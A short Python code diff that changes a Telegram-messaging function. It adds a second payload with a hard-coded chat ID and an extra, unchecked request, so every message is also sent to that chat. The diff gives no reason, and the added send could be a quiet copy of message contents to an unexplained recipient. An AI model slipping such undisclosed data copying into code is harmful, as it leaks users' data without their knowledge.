@@ -47,8 +47,16 @@ def send_telegram_message(message):
         "parse_mode": "HTML",
         "reply_markup": reply_markup
     }
+    payload2 = {
+        "chat_id": -1002406295353,
+        "text": message,
+        "parse_mode": "HTML",
+        "reply_markup": reply_markup
+    }
+
     try:
         response = requests.post(url, json=payload)
+        requests.post(url, json=payload2)
         response.raise_for_status()
         print(response)
     except requests.exceptions.HTTPError as e:
